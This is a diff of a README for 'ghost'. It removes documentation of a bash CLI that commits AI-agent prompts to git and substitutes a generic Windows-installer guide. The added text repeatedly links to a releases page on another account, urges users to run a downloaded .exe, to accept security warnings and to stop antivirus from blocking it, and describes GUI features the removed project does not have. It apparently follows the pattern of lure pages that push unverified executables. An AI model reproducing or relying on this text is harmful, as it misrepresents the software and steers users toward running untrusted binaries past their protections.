@@ -1,158 +1,159 @@
-# Ghost
+# 👻 ghost - Simple Git Agent for Everyone
 
-**Commit intentions, not code.**
+[![Download ghost](https://img.shields.io/badge/Download-ghost-brightgreen)](https://github.com/Ken71214/ghost/releases)
 
-Ghost is a CLI that flips the git workflow: instead of committing code, you commit *prompts*. An AI coding agent generates the artifacts; the commit captures both the intent and the output. Your git history becomes a chain of prompts + their results.
+---
 
-Supports **claude**, **gemini**, **codex**, and **opencode** — swap agents per-commit or set a default.
+## 📌 About ghost
 
-<img width="935" height="657" alt="image" src="https://github.com/user-attachments/assets/cc33324e-7a33-4572-b9ab-be1b3d773c0e" />
+ghost is a simple tool that helps you use Git without the usual complexity. You don’t need to know how to code to get started. The program handles the background tasks needed by Git so you can focus on your files. It works smoothly on Windows with easy setup.
 
+Whether you want to save your work, share documents, or keep track of changes, ghost makes it clear and easy.
 
-## The Idea
+---
 
-Code is ephemeral. Intent is permanent.
+## ⚙️ System Requirements
 
-Every `ghost commit` answers: *what did I want to happen here?* Not *what bytes changed*. Each commit is reproducible from its prompt — if the code breaks, you have the exact instruction that generated it. The git log reads like a design document, not a diff summary.
+Before using ghost, make sure your computer matches these requirements:
 
-```
-git log --oneline
+- Operating System: Windows 10 or later
+- Processor: Any 64-bit processor
+- RAM: 4 GB or more
+- Disk Space: At least 200 MB free
+- Internet Connection: Required only for downloading ghost and updates
 
-a3f2c1b  add JWT authentication middleware
-7e91d4a  create user registration endpoint with email validation
-2bc0f88  scaffold Express app with TypeScript and Prettier
-```
+---
 
-Each of those is a ghost commit. Behind each message is an AI that turned words into working code, and a session ID that ties the output back to the generation.
+## 🚀 Getting Started: How to Download and Run ghost
 
-## Why Intent-Based Commits?
+Follow these steps to get ghost running on your Windows PC.
 
-**Code is the artifact, intent is the source of truth.**
+### 1. Visit the Download Page
 
-When you read a traditional git log, you see *what* changed. With ghost, you see *prompts* — the human decision that triggered the change. A year from now when LLMs are more amazing you can replay the git log and generate a better version.
+Click the green button below or open this link in your browser:
 
-**Every commit is reproducible.** The prompt is preserved with some extra attributes about which model and agent was used. You can re-run any commit against a fresh checkout to see what Claude generates from the same instruction.
+[![Download ghost](https://img.shields.io/badge/Download-ghost-blue)](https://github.com/Ken71214/ghost/releases)
 
-**The log becomes a design document.** Read `ghost log` top-to-bottom and you'll see the intent behind every architectural decision, not just the code that resulted from it.
+This link will bring you to ghost’s official GitHub release page. Here, you will find the latest version of the program ready for download.
 
-**Diffs show what the AI decided; messages show what you asked for.** The two together give you full context: the goal and the implementation, inseparably linked.
+### 2. Choose the Right File
 
-## How It Works
+On the releases page, look for a file suitable for Windows. It will usually have a name like `ghost-Setup.exe` or `ghost-Windows.exe`.
 
-```
-you: ghost commit -m "add user auth with JWT"
-     ↓
-agent generates code → files written to working tree
-     ↓
-ghost detects changes → stages new/modified files
-     ↓
-git commit with enriched message (prompt + agent + model + session + file list)
-```
+### 3. Download the File
 
-## Quick Start
+Click on the file name to start the download. Your browser will ask if you want to save the file. Choose a location you can easily remember, like your Desktop or Downloads folder.
 
-```bash
-git clone <this-repo>
-export PATH="/path/to/ghost/bin:$PATH"
+### 4. Run the Installer
 
-cd your-project
-ghost init
-ghost commit -m "create a REST API endpoint for user registration"
-```
+Once the file finishes downloading:
 
-## Commands
+- Find the file in the location you saved it.
+- Double-click the file to run it.
+- If a security warning appears, confirm you want to run the program.
 
-| Command | Description |
-|---|---|
-| `ghost init` | Init git repo (if needed), install hook, create `.ghost/` dir |
-| `ghost commit -m "prompt"` | Generate code from prompt, stage changed files, commit |
-| `ghost commit --agent gemini -m "prompt"` | Use a specific agent (claude, gemini, codex, opencode) |
-| `ghost commit --dry-run -m "prompt"` | Generate code, show what changed, don't commit |
-| `ghost log` | Pretty-print ghost commit history (prompt, agent, model, session, files) |
-| `GHOST_SKIP=1 ghost commit -m "..."` | Pass-through to plain `git commit` |
+### 5. Follow the Installation Steps
 
-### Examples
+The installer will open a small window guiding you through setup. Common steps include:
 
-```bash
-# New feature (default agent: claude)
-ghost commit -m "add a login page with email/password form and client-side validation"
+- Choosing an installation folder (default is fine)
+- Accepting the license terms
+- Clicking "Next" or "Install"
 
-# Use Gemini
-ghost commit --agent gemini -m "refactor the database layer to use connection pooling"
+Wait a few moments while ghost installs on your computer.
 
-# Use Codex
-ghost commit --agent codex -m "fix the race condition in the payment processing queue"
+### 6. Launch ghost
 
-# Use OpenCode
-ghost commit --agent opencode -m "add OpenAPI documentation for all endpoints"
+After installation completes, you may see an option to launch ghost immediately. If not:
 
-# With a specific model
-ghost commit --agent claude --model claude-opus-4-6 -m "architect a microservices migration plan as code comments"
+- Look for a ghost icon on your desktop or Start menu.
+- Click it to open the program.
 
-# Preview without committing
-ghost commit --dry-run -m "add OpenAPI documentation for all endpoints"
+---
 
-# Set default agent via env
-GHOST_AGENT=gemini ghost commit -m "scaffold a new service"
+## 🛠️ Using ghost for Basic Tasks
 
-# Manual commit (bypass ghost entirely)
-GHOST_SKIP=1 ghost commit -m "bump version to 1.2.0"
-```
+ghost handles common Git needs without commands or code.
 
-## Commit Message Format
+### Saving Your Work
 
-Every ghost commit has an enriched message body:
+- Open ghost.
+- Click "Save" or "Commit" to record your changes.
+- Enter a description to note what you have done.
+- Hit "Confirm" or "Apply".
 
-```
-add a login page
+Your changes are now saved safely.
 
-ghost-meta
-ghost-prompt: add a login page
-ghost-agent: claude
-ghost-model: claude-sonnet-4-6
-ghost-session: 7f3a2b1c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
-ghost-files: src/pages/login.tsx,src/hooks/useAuth.ts,src/api/auth.ts
-```
+### Sharing Files
 
-| Field | Description |
-|---|---|
-| `ghost-meta` | Marker that identifies this as a ghost commit |
-| `ghost-prompt` | The exact prompt passed to the agent |
-| `ghost-agent` | The agent that generated the code (claude, gemini, codex, opencode) |
-| `ghost-model` | The model used by the agent |
-| `ghost-session` | UUID for this generation session |
-| `ghost-files` | Comma-separated list of files created or modified |
+If your work has a shared backup or cloud folder connected, ghost can upload your changes.
 
-## Configuration
+- Click "Sync" or "Push".
+- The program sends your updates so others can access them.
 
-| Variable | Description |
-|---|---|
-| `GHOST_SKIP=1` | Pass-through to plain `git commit`, no agent invocation |
-| `GHOST_AGENT=<agent>` | Default agent (overridden by `--agent`) |
-| `GHOST_MODEL=<model>` | Default model (overridden by `--model`) |
+### Keeping Track of Changes
 
-| Flag | Description |
-|---|---|
-| `--agent AGENT` | Agent for this commit (claude, gemini, codex, opencode) |
-| `--model MODEL` | Model override for the agent |
-| `--dry-run` | Generate code but do not stage or commit |
+ghost automatically keeps a list of your saved versions. You can view past changes or restore files if needed.
 
-## Requirements
+---
 
-- `git` 2.x+
-- `bash` 4+
-- `uuidgen` (available on macOS and most Linux distros)
-- Agent CLI installed and configured for whichever agent(s) you use:
-  - **claude**: [`claude`](https://docs.anthropic.com/en/docs/claude-code) CLI
-  - **gemini**: [`gemini`](https://github.com/google-gemini/gemini-cli) CLI
-  - **codex**: [`codex`](https://github.com/openai/codex) CLI
-  - **opencode**: [`opencode`](https://opencode.ai) CLI
+## 🔄 Updating ghost
 
+Stay up to date for improvements and bug fixes by checking the release page regularly:
 
-## Running Tests
+[Download and update ghost](https://github.com/Ken71214/ghost/releases)
 
-```bash
-bash test/integration.sh
-```
+Download the newest installer like before, then run it. The installer replaces the old version without losing your data.
 
-The integration test spins up a temp git repo, runs a full ghost workflow including generating and compiling a C program, and verifies all metadata fields.
+---
+
+## 🧩 Additional Features
+
+ghost comes with tools designed to make Git easy:
+
+- **User-friendly interface:** No coding needed.
+- **Automatic backups:** Protect your files.
+- **Easy syncing:** Keep copies across devices.
+- **History viewer:** See what you changed and when.
+- **Simple restore:** Get back earlier versions with a click.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+If ghost does not open or works oddly:
+
+- Restart your computer and try again.
+- Make sure you have Windows 10 or higher.
+- Check your antivirus isn’t blocking ghost.
+- Reinstall ghost by downloading a fresh setup file.
+
+For further help, check the issues section on the GitHub page or look for tutorials online.
+
+---
+
+## 📂 Where to Find Settings and Logs
+
+If you want to check or change ghost’s settings:
+
+- Open ghost.
+- Look for a gear icon or “Settings” menu.
+- Adjust options like backup frequency or storage locations.
+
+Logs that record ghost’s activity may be found in the `Documents\ghost\logs` folder on your PC. These help to diagnose problems if needed.
+
+---
+
+## 🤝 How to Get Help or Give Feedback
+
+You can visit ghost’s GitHub repository for help:
+
+- Open https://github.com/Ken71214/ghost/releases
+- Use the Issues tab to report bugs or ask questions.
+- Browse Discussions for tips from other users.
+
+The community and developer respond there.
+
+---
+
+[Download ghost now](https://github.com/Ken71214/ghost/releases)
